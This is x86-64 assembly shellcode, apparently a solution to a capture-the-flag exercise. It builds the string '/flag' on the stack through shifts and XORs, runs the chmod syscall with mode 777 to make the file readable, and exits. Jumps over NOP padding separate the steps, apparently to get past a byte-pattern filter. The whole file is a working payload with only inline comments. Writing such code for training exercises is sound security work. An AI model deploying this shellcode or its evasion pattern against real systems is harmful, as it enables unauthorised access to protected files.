.intel_syntax noprefix

.section .text

    mov si, 0x1ff           # hex for 777 octal
    mov al, 0x2f            # rax = 0x0...002f '/'
    mov bl, 0x66            # 'f'
    jmp next
    .skip 10, 0x90
next:
    # 0x67616c662f          # encoded string: /flag
    shl bx, 0x8             
    xor ax, bx              # rax = 0x0...662f  
    jmp next2
    .skip 11, 0x90
next2:
    mov r8b, 0x6c           # 'l'
    shl r8d, 0x10
    jmp next3
    .skip 11, 0x90
next3:
    xor eax, r8d            # rax = 0x0...006c 662f
    mov r9b, 0x61           # 'a'
    push 0x0
    jmp next4
    .skip 11, 0x90
next4:
    shl r9d, 0x18
    xor eax, r9d            # rax
    jmp next5
    .skip 11, 0x90
next5:
    mov r10b, 0x67          # 'g'
    shl r10, 0x20
    jmp next6
    .skip 11, 0x90
next6:
    xor rax, r10
    push rax                # saving to stack
    mov rdi, rsp
    jmp next7
    .skip 11, 0x90
next7:
    xor rax, rax
    mov al, 90
    syscall
    jmp next8
    .skip 10, 0x90
next8:
    xor rax, rax
    mov al, 60
    syscall

